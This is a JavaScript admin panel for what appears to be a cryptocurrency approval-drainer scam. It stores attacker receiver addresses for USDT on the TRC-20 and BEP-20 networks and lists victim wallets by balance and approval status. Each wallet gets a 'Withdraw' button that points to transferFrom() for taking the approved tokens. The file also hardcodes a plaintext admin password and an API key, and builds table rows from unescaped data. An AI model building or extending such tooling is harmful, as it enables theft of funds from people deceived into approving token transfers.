const TRC20_RECEIVER = 'TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN';
const BEP20_RECEIVER = '0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E';

const TRC20_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const BEP20_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';

const BSC_API_KEY = 'KW2H7WKIP7Q8UTFB7G7Q1U24R8XWV5KDY4';

const USERNAME = "enre.atul";
const PASSWORD = "Honda988701@";

function login() {
  const user = document.getElementById("username").value;
  const pass = document.getElementById("password").value;
  if (user === USERNAME && pass === PASSWORD) {
    document.getElementById("loginBox").classList.add("hidden");
    document.getElementById("adminPanel").classList.remove("hidden");
    loadWalletLogs();
  } else {
    alert("Invalid credentials!");
  }
}

async function loadWalletLogs() {
  const logs = JSON.parse(localStorage.getItem("walletLogs") || "[]");
  const tbody = document.getElementById("logTable");
  tbody.innerHTML = "";

  for (let log of logs) {
    const tr = document.createElement("tr");

    tr.innerHTML = `
      <td>${log.time}</td>
      <td>${log.network}</td>
      <td>${log.address}</td>
      <td>${log.balance}</td>
      <td>${log.approved}</td>
      <td><button onclick="manualWithdraw('${log.network}', '${log.address}')">Withdraw</button></td>
    `;

    tbody.appendChild(tr);
  }
}

async function manualWithdraw(network, userAddress) {
  alert(`Manual withdraw for ${userAddress} on ${network.toUpperCase()} — Please use transferFrom() in a smart contract.`);
}

document.getElementById("searchInput").addEventListener("input", function () {
  const value = this.value.toLowerCase();
  const rows = document.querySelectorAll("#logTable tr");
  rows.forEach(row => {
    row.style.display = row.innerText.toLowerCase().includes(value) ? "" : "none";
  });
});

window.addEventListener("load", async () => {
  // dummy test data on load (replace with real in live dApp)
  const dummyLogs = [
    {
      time: new Date().toLocaleString(),
      network: "TRC-20",
      address: "TABC1234567890XYZ",
      balance: "500 USDT",
      approved: "Yes"
    },
    {
      time: new Date().toLocaleString(),
      network: "BEP-20",
      address: "0xABC1234567890XYZDEF",
      balance: "340 USDT",
      approved: "Yes"
    }
  ];

  localStorage.setItem("walletLogs", JSON.stringify(dummyLogs));
});
